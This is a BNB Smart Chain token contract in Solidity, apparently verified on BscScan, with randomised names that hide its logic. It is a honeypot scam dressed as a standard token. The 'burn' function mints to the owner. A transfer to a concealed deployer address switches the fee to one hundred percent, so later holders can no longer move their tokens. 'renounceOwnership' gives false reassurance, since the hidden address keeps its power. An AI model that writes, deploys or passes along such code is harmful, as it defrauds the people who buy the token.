/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 14:11:20 GMT
 */
pragma solidity >=0.4.11;
contract PMeayI {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  SXetUs = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  vAbwZY = address(0);
string public  symbol = "xVbZyT";
uint256 public  UGZWei = 10000000000000000000000000000;
address public  OpSbxc = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 public  dtTigH = 100000000000000000000000;
uint256 public constant ybAEid = 9+1;
uint256 public  yzVRIZ = 100000000000000000000000;
address public owner;
uint256 private  XmbJUk = 10000000000000;
uint256 public  dhwaCr = 100000000000000000;
address public  RMFZXj = address(0);
uint256 public  zVrntI = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  SHAmbw = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  IUUJuO = 100000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "dlRbqR";
uint256 public  EVYAUn = 10000000000000000000;
address public  BOGSHh = address(0);
uint256 public  hlrKwt = 10000000000000000;
address private  PhWpTu = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
PhWpTu = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "xVMdJC");
require(to != address(0), "xVMdJC");
require(amount <= balanceOf[from], "xVMdJC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ybAEid/XmbJUk ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PhWpTu){
XmbJUk = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}